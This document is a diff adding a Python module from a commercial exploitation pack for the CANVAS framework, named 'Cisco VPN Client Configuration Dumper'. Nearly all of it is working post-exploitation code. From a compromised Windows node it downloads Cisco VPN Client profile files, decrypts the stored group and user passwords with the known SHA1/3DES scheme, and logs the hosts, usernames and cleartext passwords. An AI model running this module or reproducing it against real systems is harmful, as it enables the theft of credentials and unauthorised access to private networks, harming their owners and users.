@@ -1,0 +1,197 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2009
+#
+
+import re
+import os
+import sys
+import sha
+import struct
+
+if '.' not in sys.path:
+    sys.path.append('.')
+
+from exploitutils import *
+from canvasexploit import canvasexploit
+from shelllistener import *
+from MOSDEF import mosdef
+import canvasengine
+
+
+# GUI info
+NAME = "Cisco VPN Client Configuration Dumper"
+
+DESCRIPTION = "Get VPN configuration file(s) of Cisco VPN client and decrypt the password."
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "Cisco"
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+
+VERSION = "1.0"
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Commands"
+PROPERTY['ARCH'] = [["Windows"]]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+class theexploit(canvasexploit):
+
+    def __init__(self):
+        canvasexploit.__init__(self)        
+        self.name = NAME    
+        self.local_path = os.getcwd() + "\\3rdparty\\D2SEC\\exploits\\d2sec_cisco_vpn\\files\\"
+        self.profiles_path = "C:\\Program Files\\Cisco Systems\\VPN Client\\Profiles\\"
+                
+        return
+  
+    def decrypt(self, data):
+        if data == "":
+          return ""
+        
+        encrypted_data = data.decode("hex")
+        
+        # Verification
+        hash_v_data = encrypted_data[40:]
+        sha1_hash_v = sha.new(hash_v_data)      
+        if not (sha1_hash_v.hexdigest() == encrypted_data[20:40].encode("hex")):
+          self.log("Bad encrypted password format")
+          return ""  
+        
+        # Create the first hash
+        hash_1_data = encrypted_data[:19] + chr(ord(encrypted_data[19]) + 1)
+        sha1_hash_1 = sha.new(hash_1_data)
+        key_1 = sha1_hash_1.digest()
+  
+        # Create the second hash
+        hash_2_data = encrypted_data[:19] + chr(ord(encrypted_data[19]) + 3)
+        sha1_hash_2 = sha.new(hash_2_data)
+        key_2 = sha1_hash_2.digest()
+    
+        # Create the 3DES key from the two hashes 
+        key = key_1 + key_2[:4]      
+  
+        # Create the IV
+        iv = encrypted_data[:8]
+  
+        # Decrypt password
+        try:
+          from Crypto.Cipher import DES3
+        except:
+          self.log("Error: you need pycrypto to use this exploit")	
+          return ""
+          
+        des3 = DES3.new(key, mode=DES3.MODE_CBC, IV=iv)
+        raw_pass = des3.decrypt(hash_v_data)            
+        
+        clear_pass = ""
+  
+        for c in raw_pass:
+          if ord(c) > 10:
+            clear_pass += c
+        
+        return clear_pass
+   
+    def read_conf(self, data):
+      m = re.search("Description=(.*)", data)
+      if not m == None:
+        self.log("  DESCRIPTION: %s" % m.group(1))
+
+      m = re.search("Host=(.*)", data)
+      if not m == None:
+        self.log("  HOST: %s" % m.group(1))
+
+      m = re.search("GroupName=(.*)", data)
+      if not m == None:
+        self.log("  GROUP NAME: %s" % m.group(1))
+
+      m = re.search("enc_GroupPwd=(.*)", data)
+      if not m == None:
+        self.log("  GROUP PASSWORD: %s" % self.decrypt(m.group(1)))
+
+      m = re.search("Username=(.*)", data)
+      if not m == None:
+        self.log("  USERNAME: %s" % m.group(1))
+
+      m = re.search("enc_UserPassword=(.*)", data)
+      if not m == None:
+        self.log("  USER PASSWORD: %s" % self.decrypt(m.group(1)))
+      
+      self.log("\n")
+  
+    def run_attack(self,node):
+        self.node = node
+        profiles = []
+        
+        # Download profile files
+        self.log("Download Cisco VPN Client profile files")                
+        file_count, dir_ret = self.node.shell.dodir(self.profiles_path)
+        
+        if not file_count > 2:
+            self.log("No profile files available in directory %s" % self.profiles_path)
+            return 0
+        
+        for f in dir_ret:
+          if not ( (f[-1] == ".") or (f[-1] == "..") ):
+            profiles.append(f[-1])
+        
+        for f in profiles:        
+          filename = self.profiles_path + f
+          self.log("Download %s" % filename)                
+          ret = self.node.shell.download(filename, self.local_path + f)
+          
+          if not ret:
+            self.log("Download failed.")
+            return 0
+ 
+        # Analyze profile files
+        files = os.listdir(self.local_path)
+        
+        self.log("----- PROFILE FILES -----\n")
+        
+        for file in files:
+          filename = self.local_path + file
+              
+          if os.path.isfile(filename):
+            self.log("FILENAME: %s" % file)
+                
+            f = open(filename, "r")
+            data = f.read()
+            f.close()
+            
+            # Read configuration
+            self.read_conf(data)
+            
+        self.log("-------------------------\n")
+            
+        return 1
+
+    def run(self):
+        self.setInfo("%s (in progress)" % (NAME))
+        success = 0 
+        
+        for node in self.argsDict["passednodes"]:
+            if "win32api" not in node.capabilities:
+                self.log("Node %s not a Win32 node" % (node.getname()))
+                continue
+                
+            ret = self.run_attack(node)
+            
+            if ret == 1:
+                success = 1
+                
+        return success
+
+if __name__=='__main__':
+    print 'This win32 local module is meant to be run only within CANVAS'
